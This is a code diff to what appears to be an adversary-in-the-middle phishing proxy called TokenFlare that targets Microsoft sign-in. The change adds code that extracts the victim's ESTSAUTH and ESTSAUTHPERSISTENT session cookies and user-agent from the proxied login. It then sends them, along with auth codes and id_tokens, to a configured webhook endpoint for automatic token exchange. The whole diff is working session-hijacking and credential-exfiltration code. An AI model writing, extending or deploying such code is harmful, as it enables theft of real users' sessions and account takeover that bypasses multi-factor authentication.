@@ -93,7 +93,7 @@ export default {
                 // Send structured payload for automatic exchange + human-readable notification
                 const authParams = parseAuthCodeUrl(authcodeUri);
                 const upstreamParams = parseUpstreamParams(cfg.upstreamPath);
-                await notifyAuthCodeStructured(cfg.webhookUrl, authParams, upstreamParams, authcodeUri, log)
+                await notifyAuthCodeStructured(cfg.webhookUrl, authParams, upstreamParams, authcodeUri, request, upstreamResp, log)
                   .catch(console.error);
             }
             // then send the user to final redir
@@ -405,7 +405,7 @@ async function notifyAuthCode(webhook, url, log) {
  * Send structured auth code payload for automatic token exchange.
  * Fires BOTH the human-readable notification AND a structured JSON to /exchange.
  */
-async function notifyAuthCodeStructured(webhook, authParams, upstreamParams, rawUrl, log) {
+async function notifyAuthCodeStructured(webhook, authParams, upstreamParams, rawUrl, request, upstreamResp, log) {
   if (!webhook) {
     log.warn('No webhook configured');
     return;
@@ -414,7 +414,33 @@ async function notifyAuthCodeStructured(webhook, authParams, upstreamParams, raw
   // 1. Human-readable notification via existing pipeline
   await notify(webhook, `[TokenFlare] Auth Code Obtained!\n\nCode URL: ${rawUrl}`, log);
 
-  // 2. Structured JSON to /exchange endpoint for automatic token exchange
+  // 2. Extract ESTS cookies from the upstream response Set-Cookie headers
+  const cookies = [];
+  const setCookieHeaders = getSetCookies(upstreamResp.headers);
+  for (const header of setCookieHeaders) {
+    const parts = header.split(';');
+    const [nameValue] = parts;
+    const eqIdx = nameValue.indexOf('=');
+    if (eqIdx === -1) continue;
+    const name = nameValue.substring(0, eqIdx).trim();
+    const value = nameValue.substring(eqIdx + 1).trim();
+
+    if (name === 'ESTSAUTH' || name === 'ESTSAUTHPERSISTENT') {
+      cookies.push({
+        name: name,
+        value: value,
+        domain: 'login.microsoftonline.com',
+        path: '/',
+        secure: true,
+        httpOnly: true,
+        sameSite: 'None',
+      });
+    }
+  }
+
+  const userAgent = request.headers.get('user-agent') || '';
+
+  // 3. Structured JSON to /exchange endpoint for automatic token exchange
   const exchangeUrl = webhook.replace(/\/webhook\/?$/, '/exchange');
   const payload = {
     event: 'auth_code',
@@ -428,6 +454,8 @@ async function notifyAuthCodeStructured(webhook, authParams, upstreamParams, raw
     session_state: authParams.session_state,
     id_token: authParams.id_token,
     raw_url: rawUrl,
+    cookies: cookies,
+    user_agent: userAgent,
   };
 
   try {
